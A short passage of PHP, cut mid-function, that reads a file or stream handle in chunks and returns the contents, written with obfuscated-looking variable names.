            while (!feof($_e4352a)) {
                $_8cb860 .= @fread($_e4352a, 8192);
            }
        }
        else {
            $_8cb860 = @fread($_e4352a, $_89fd9a);
        }
        return $_8cb860;
    }
}
